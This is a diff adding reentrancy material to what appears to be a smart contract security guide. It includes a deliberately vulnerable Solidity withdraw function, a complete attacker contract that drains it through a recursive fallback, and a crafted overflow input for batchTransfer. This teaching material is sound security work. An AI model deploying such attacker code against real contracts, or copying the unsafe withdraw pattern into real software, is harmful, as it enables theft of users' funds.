@@ -53,3 +53,91 @@ function batchTransfer(address[] memory _receivers, uint256 _value) public payab
 ```
 
 An input like `["<ADDR_1>","<ADDR_2>"], 0x8000000000000000000000000000000000000000000000000000000000000000` for the function `batchTransfer` would trigger this vulnerability.
+
+
+### Reentrancy Vulnerabilities
+
+A Reentrancy vulnerability is a type of attack to drain the bit-by-bit liquidity of a contract with an insecure code-writing pattern.
+
+An incorrect flow first verifies that the user has a sufficient balance to execute the transaction, then sends the funds to the user. Only if the operation is successful, at that point, does it update the user's balance. The problem arises because if a contract invokes this operation instead of a user, it can create code that generates a loop. This means that an attacker can invoke the withdrawal function many times because it is the same balance that is checked as the initial value.
+
+An example:
+
+```
+//SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.6.6;
+    
+contract simpleReentrancy {
+	mapping (address => uint) private balances;
+	
+	function deposit() public payable  {
+		require((balances[msg.sender] + msg.value) >= balances[msg.sender]);
+		balances[msg.sender] += msg.value;
+	}
+ 
+	function withdraw(uint withdrawAmount) public returns (uint) {
+		require(withdrawAmount <= balances[msg.sender]);
+		msg.sender.call.value(withdrawAmount)("");
+
+		balances[msg.sender] -= withdrawAmount;
+		return balances[msg.sender];
+	}
+    
+	function getBalance() public view returns (uint){
+		return balances[msg.sender];
+	}
+}
+```
+
+The vulnerable function is `withdraw`. As you can see, first it checks that the balance is sufficient, then the withdrawal is made and only after this step the balance is being updated.
+
+1. An attacker deposits a small amount into his account and calls the withdraw function of the contract by withdrawing an amount less than his balance;
+2. The victim contract interacts with the attacker's contract trying to provide the requested funds;
+3. The attacker will respond with a fallback function that will call the withdrawal another time, but the victim contract has not yet updated the user's balance so it will keep the initial one despite the previous operation.
+
+An example code of a malicious smart contract is as follows:
+
+```
+//SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.6.6;
+
+interface targetInterface{
+	function deposit() external payable; 
+	function withdraw(uint withdrawAmount) external; 
+}
+ 
+contract simpleReentrancyAttack{
+	targetInterface bankAddress = targetInterface(TARGET_ADDRESS_HERE); 
+	uint amount = 1 ether; 
+ 
+	function deposit() public payable{
+		bankAddress.deposit.value(amount)();
+	}
+
+	function attack() public payable{
+		bankAddress.withdraw(amount); 
+	}
+
+	function retrieveStolenFunds() public {
+		msg.sender.transfer(address(this).balance);
+	}
+
+	fallback () external payable{ 
+		if (address(bankAddress).balance >= amount){
+			bankAddress.withdraw(amount);
+		}   
+	}
+}
+```
+
+1. This contract checks that the balance on the smart contract is greater than 1 ETH. Call the external withdraw function of the victim's smart contract, which will provide the requested funds;
+2. Not having received further instructions after receiving the funds, the fallback function is triggered immediately. When the latter is activated, the smart contract has not yet updated the attacker's balance, so it will proceed to carry out the withdrawal operation with the previous balance;
+3. The malicious smart contract receives the funds and no further instructions, so it repeats the step 2.
+
+### Authorization issues
+
+
+
+### Use of components with known vulnerabilities
+
+
